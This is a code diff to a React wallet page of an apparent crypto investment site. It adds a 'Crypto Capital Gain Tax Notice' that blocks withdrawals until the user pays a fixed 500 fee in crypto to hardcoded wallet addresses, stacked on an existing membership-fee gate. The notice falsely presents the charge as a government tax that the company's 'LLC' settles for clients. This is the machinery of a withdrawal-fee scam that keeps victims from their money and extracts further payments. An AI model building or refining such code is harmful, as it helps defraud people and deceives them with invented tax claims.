@@ -17,7 +17,10 @@ import {
   Lock,
   Gift,
   ShieldCheck,
-  Info
+  Info,
+  Calendar,
+  ArrowLeft,
+  FileText
 } from "lucide-react";
 import { Card } from "@/components/ui/Card";
 import { Input } from "@/components/ui/Input";
@@ -28,11 +31,12 @@ import { Skeleton } from "@/components/ui/Skeleton";
 import { StatusBanner } from "@/components/status/StatusBanner";
 import { useStatus } from "@/hooks/useStatus";
 import { useAccount } from "@/context/AccountContext";
-import { fetchWallet, requestDeposit, requestWithdrawal, requestSubscription } from "@/lib/endpoints";
+import { fetchWallet, requestDeposit, requestWithdrawal, requestSubscription, requestTaxPayment } from "@/lib/endpoints";
 import { formatCurrency } from "@/lib/currency";
 import { Wallet, WalletTransaction } from "@/types";
 
 const MEMBERSHIP_FEE = 200;
+const TAX_FEE = 500;
 
 const SUPPORTED_ASSETS = ["BTC", "USDT", "ETH", "TRON", "BNB", "USDC"] as const;
 
@@ -46,10 +50,24 @@ const NETWORK_MAPPING: Record<string, string[]> = {
 };
 
 const DEPOSIT_ADDRESSES: Record<string, string> = {
-  "Bitcoin Native": "bc1qrhzw6dq240nt0r267j9r0alj9ecaqelmp9e7dn",
-  "Ethereum (ERC20)": "0xeDfD84Ed03178bFCa081D89B7d98064cD28CDdeF",
-  "Tron (TRC20)": "TACTvvULH7gaU5dfjCoFgztr48qk2PRG8Y",
-  "BSC (BEP20)": "0xeDfD84Ed03178bFCa081D89B7d98064cD28CDdeF",
+  // Generic fallbacks
+  "Bitcoin Native": "bc1q8gahuyx5rfa79ukge2gl7eqayaykrmh03tyq7e",
+  "Ethereum (ERC20)": "0xc7ea91890210119F06ABe62d437246235C9d6a39",
+  "Tron (TRC20)": "TJJdnzLPJGQUsLTBSrT6u56NVFjN8kGhSP",
+  "BSC (BEP20)": "0xc7ea91890210119F06ABe62d437246235C9d6a39",
+
+  // Specific Asset & Network Mappings
+  "BTC_Bitcoin Native": "bc1q8gahuyx5rfa79ukge2gl7eqayaykrmh03tyq7e",
+  "ETH_Ethereum (ERC20)": "0xc7ea91890210119F06ABe62d437246235C9d6a39",
+  "TRON_Tron (TRC20)": "TJJdnzLPJGQUsLTBSrT6u56NVFjN8kGhSP",
+  "BNB_BSC (BEP20)": "0xc7ea91890210119F06ABe62d437246235C9d6a39",
+
+  "USDT_Tron (TRC20)": "TJJdnzLPJGQUsLTBSrT6u56NVFjN8kGhSP",
+  "USDT_Ethereum (ERC20)": "0xc7ea91890210119F06ABe62d437246235C9d6a39",
+  "USDT_BSC (BEP20)": "0xc7ea91890210119F06ABe62d437246235C9d6a39",
+
+  "USDC_Ethereum (ERC20)": "0xc7ea91890210119F06ABe62d437246235C9d6a39",
+  "USDC_BSC (BEP20)": "0xc7ea91890210119F06ABe62d437246235C9d6a39",
 };
 
 export default function WalletPage() {
@@ -61,7 +79,8 @@ export default function WalletPage() {
   const [isDepositOpen, setIsDepositOpen] = useState(false);
   const [isWithdrawOpen, setIsWithdrawOpen] = useState(false);
   const [isMembershipGateOpen, setIsMembershipGateOpen] = useState(false);
-  const [depositMode, setDepositMode] = useState<"deposit" | "subscription">("deposit");
+  const [isTaxNoticeOpen, setIsTaxNoticeOpen] = useState(false);
+  const [depositMode, setDepositMode] = useState<"deposit" | "subscription" | "tax">("deposit");
 
   // Form State - Deposit
   const [depAmount, setDepAmount] = useState("");
@@ -176,6 +195,27 @@ export default function WalletPage() {
       return;
     }
 
+    if (depositMode === "tax") {
+      setIsSubmitting(true);
+      try {
+        await requestTaxPayment(accountId, {
+          asset: depAsset,
+          network: depNetwork,
+          paymentProof,
+        });
+        setPaymentProof("");
+        setProofFileName("");
+        await loadWallet();
+        setIsDepositOpen(false);
+        status.success("Capital Gain Tax payment submitted. Awaiting admin review.");
+      } catch (err) {
+        status.error((err as any)?.message || "Failed to submit tax payment.");
+      } finally {
+        setIsSubmitting(false);
+      }
+      return;
+    }
+
     const amt = parseFloat(depAmount);
     if (isNaN(amt) || amt <= 0) {
       status.error("Please enter a valid amount greater than 0");
@@ -210,6 +250,14 @@ export default function WalletPage() {
     setIsDepositOpen(true);
   };
 
+  const handlePayCapitalGainTax = () => {
+    setIsTaxNoticeOpen(false);
+    setDepositMode("tax");
+    setPaymentProof("");
+    setProofFileName("");
+    setIsDepositOpen(true);
+  };
+
   const handleWithdrawalSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!accountId) return;
@@ -228,6 +276,12 @@ export default function WalletPage() {
     if (wallet && !wallet.membershipActive) {
       setIsWithdrawOpen(false);
       setIsMembershipGateOpen(true);
+      return;
+    }
+
+    if (wallet && !wallet.taxActive) {
+      setIsWithdrawOpen(false);
+      setIsTaxNoticeOpen(true);
       return;
     }
 
@@ -265,7 +319,10 @@ export default function WalletPage() {
     );
   }
 
-  const depositAddress = DEPOSIT_ADDRESSES[depNetwork] || "0xDepositAddressMock";
+  const depositAddress =
+    DEPOSIT_ADDRESSES[`${depAsset}_${depNetwork}`] ||
+    DEPOSIT_ADDRESSES[depNetwork] ||
+    "0xc7ea91890210119F06ABe62d437246235C9d6a39";
 
   return (
     <div className="flex flex-col gap-6">
@@ -330,7 +387,19 @@ export default function WalletPage() {
           <ArrowDownLeft className="h-4 w-4" />
           Deposit
         </Button>
-        <Button variant="secondary" className="w-full" onClick={() => setIsWithdrawOpen(true)}>
+        <Button
+          variant="secondary"
+          className="w-full"
+          onClick={() => {
+            if (wallet && !wallet.membershipActive) {
+              setIsMembershipGateOpen(true);
+            } else if (wallet && !wallet.taxActive) {
+              setIsTaxNoticeOpen(true);
+            } else {
+              setIsWithdrawOpen(true);
+            }
+          }}
+        >
           <ArrowUpRight className="h-4 w-4" />
           Withdraw
         </Button>
@@ -377,6 +446,7 @@ export default function WalletPage() {
                 {wallet.fundingHistory.map((tx: WalletTransaction) => {
                   const isDep = tx.type === "DEPOSIT";
                   const isSub = tx.type === "SUBSCRIPTION";
+                  const isTax = tx.type === "TAX";
                   const isPending = tx.status === "PENDING";
                   const isApproved = tx.status === "APPROVED";
                   const isRejected = tx.status === "REJECTED";
@@ -387,9 +457,9 @@ export default function WalletPage() {
                         {new Date(tx.createdAt).toLocaleDateString(undefined, { month: "short", day: "numeric", year: "numeric" })}
                       </td>
                       <td className="py-3 pr-4">
-                        <span className={`inline-flex items-center gap-1 font-semibold ${isSub ? "text-gold" : isDep ? "text-green-400" : "text-rose-400"}`}>
-                          {isSub ? <ShieldCheck className="h-3.5 w-3.5" /> : isDep ? <ArrowDownLeft className="h-3.5 w-3.5" /> : <ArrowUpRight className="h-3.5 w-3.5" />}
-                          {isSub ? "Membership" : isDep ? "Deposit" : "Withdrawal"}
+                        <span className={`inline-flex items-center gap-1 font-semibold ${isSub || isTax ? "text-gold" : isDep ? "text-green-400" : "text-rose-400"}`}>
+                          {isSub ? <ShieldCheck className="h-3.5 w-3.5" /> : isTax ? <FileText className="h-3.5 w-3.5" /> : isDep ? <ArrowDownLeft className="h-3.5 w-3.5" /> : <ArrowUpRight className="h-3.5 w-3.5" />}
+                          {isSub ? "Membership" : isTax ? "Capital Gain Tax" : isDep ? "Deposit" : "Withdrawal"}
                         </span>
                       </td>
                       <td className="py-3 pr-4 text-text-primary">
@@ -435,7 +505,13 @@ export default function WalletPage() {
       <Modal
         isOpen={isDepositOpen}
         onClose={() => setIsDepositOpen(false)}
-        title={depositMode === "subscription" ? "Activate Membership" : "Deposit Assets"}
+        title={
+          depositMode === "subscription"
+            ? "Activate Membership"
+            : depositMode === "tax"
+            ? "Pay Capital Gain Tax"
+            : "Deposit Assets"
+        }
       >
         <form onSubmit={handleDepositSubmit} className="flex flex-col gap-4">
           <div className="grid grid-cols-2 gap-4">
@@ -492,7 +568,13 @@ export default function WalletPage() {
               </button>
             </div>
             <span className="text-[10px] text-text-muted italic">
-              Send tokens to this address then submit your {depositMode === "subscription" ? "membership payment" : "deposit request"} below.
+              Send tokens to this address then submit your{" "}
+              {depositMode === "subscription"
+                ? "membership payment"
+                : depositMode === "tax"
+                ? "tax payment"
+                : "deposit request"}{" "}
+              below.
             </span>
           </div>
 
@@ -500,6 +582,11 @@ export default function WalletPage() {
             <div className="flex items-center justify-between rounded-xl border border-gold/20 bg-gold/[0.04] p-4">
               <span className="text-xs font-semibold text-text-secondary uppercase tracking-wider">Membership Fee</span>
               <span className="text-lg font-bold text-gold">{formatCurrency(MEMBERSHIP_FEE, selectedAccount.currency)}</span>
+            </div>
+          ) : depositMode === "tax" ? (
+            <div className="flex items-center justify-between rounded-xl border border-gold/20 bg-gold/[0.04] p-4">
+              <span className="text-xs font-semibold text-text-secondary uppercase tracking-wider">Capital Gain Tax Fee</span>
+              <span className="text-lg font-bold text-gold">{formatCurrency(TAX_FEE, selectedAccount.currency)}</span>
             </div>
           ) : (
             <div className="flex flex-col gap-1.5">
@@ -548,7 +635,11 @@ export default function WalletPage() {
           <StatusBanner status={status.status} />
 
           <Button type="submit" variant="primary" className="w-full" isLoading={isSubmitting} disabled={isLoading}>
-            {depositMode === "subscription" ? "Verify & Submit Membership Payment" : "Verify & Submit Deposit"}
+            {depositMode === "subscription"
+              ? "Verify & Submit Membership Payment"
+              : depositMode === "tax"
+              ? "Verify & Submit Tax Payment"
+              : "Verify & Submit Deposit"}
           </Button>
         </form>
       </Modal>
@@ -634,6 +725,96 @@ export default function WalletPage() {
         >
           Back to Withdrawal
         </button>
+      </Modal>
+
+      {/* Crypto Capital Gain Tax Notice Modal */}
+      <Modal
+        isOpen={isTaxNoticeOpen}
+        onClose={() => setIsTaxNoticeOpen(false)}
+      >
+        <div className="flex flex-col items-center text-center px-1 py-1">
+          {/* Circular Gold Header Icon */}
+          <div className="mx-auto flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-b from-amber-300 via-gold to-amber-600 p-0.5 shadow-lg shadow-gold/20 mb-3">
+            <div className="flex h-full w-full items-center justify-center rounded-full bg-black/90 text-gold">
+              <FileText className="h-8 w-8 text-amber-300" />
+            </div>
+          </div>
+
+          {/* Notice Title */}
+          <h2 className="text-xl sm:text-2xl font-black tracking-wider text-text-primary uppercase font-mono">
+            CRYPTO CAPITAL GAIN TAX NOTICE
+          </h2>
+
+          {/* Central Node Dot Divider */}
+          <div className="relative flex items-center justify-center w-full my-3">
+            <div className="w-full border-t border-gold/40"></div>
+            <div className="absolute h-2.5 w-2.5 rounded-full bg-gold shadow-md shadow-gold"></div>
+          </div>
+
+          {/* Verbatim Body Paragraph 1 */}
+          <p className="text-xs text-text-secondary text-center leading-relaxed font-sans">
+            Due to regulations applicable in your country of residence, a government tax of{" "}
+            <span className="text-gold font-bold">{formatCurrency(TAX_FEE, selectedAccount.currency)}</span> is associated with your account before withdrawals can be processed.
+          </p>
+
+          {/* Verbatim Body Paragraph 2 */}
+          <p className="text-xs text-text-secondary text-center leading-relaxed font-sans mt-3">
+            To make this process more convenient for our clients, our company administers this requirement through our LLC on behalf of eligible account holders. Rather than requiring each client to complete the process individually, we manage the required compliance under our corporate framework, allowing clients to pay a fixed annual fee of{" "}
+            <span className="text-gold font-bold">{formatCurrency(TAX_FEE, selectedAccount.currency)}</span> and{" "}
+            <span className="text-gold font-bold">not get taxed individually</span>. Once your annual payment has been completed and verified, your account will remain covered for the applicable yearly period.
+          </p>
+
+          {/* Amount Due and Validity Container */}
+          <div className="flex flex-col gap-2.5 w-full mt-5">
+            <div className="flex items-center justify-between rounded-xl border border-gold/40 bg-gold/[0.04] p-3.5 shadow-inner">
+              <div className="flex items-center gap-3">
+                <div className="flex h-8 w-8 items-center justify-center rounded-full bg-gold/20 text-gold border border-gold/30">
+                  <Coins className="h-4 w-4" />
+                </div>
+                <span className="text-xs font-black tracking-wider text-text-secondary uppercase">AMOUNT DUE:</span>
+              </div>
+              <span className="text-xl font-extrabold text-gold font-mono tracking-tight">
+                {formatCurrency(TAX_FEE, selectedAccount.currency)}
+              </span>
+            </div>
+
+            <div className="flex items-center justify-between rounded-xl border border-gold/40 bg-gold/[0.04] p-3.5 shadow-inner">
+              <div className="flex items-center gap-3">
+                <div className="flex h-8 w-8 items-center justify-center rounded-full bg-gold/20 text-gold border border-gold/30">
+                  <Calendar className="h-4 w-4" />
+                </div>
+                <span className="text-xs font-black tracking-wider text-text-secondary uppercase">VALIDITY:</span>
+              </div>
+              <span className="text-xl font-extrabold text-gold font-mono tracking-tight">
+                12 MONTHS
+              </span>
+            </div>
+          </div>
+
+          {/* Action Buttons */}
+          <div className="flex flex-col gap-2.5 w-full mt-5">
+            <Button
+              variant="gold"
+              className="w-full py-3 text-sm font-black uppercase tracking-wider shadow-lg shadow-gold/20 flex items-center justify-center"
+              onClick={handlePayCapitalGainTax}
+            >
+              <ShieldCheck className="h-4 w-4 mr-2" />
+              PAY CAPITAL GAIN TAX
+            </Button>
+
+            <button
+              type="button"
+              onClick={() => {
+                setIsTaxNoticeOpen(false);
+                setIsWithdrawOpen(true);
+              }}
+              className="w-full flex items-center justify-center gap-2 py-2.5 rounded-xl border border-white/10 bg-white/[0.02] text-xs font-bold text-text-secondary hover:text-text-primary hover:bg-white/[0.05] transition-all uppercase tracking-wider"
+            >
+              <ArrowLeft className="h-4 w-4" />
+              BACK TO WITHDRAWAL
+            </button>
+          </div>
+        </div>
       </Modal>
 
       {/* Withdraw Modal */}
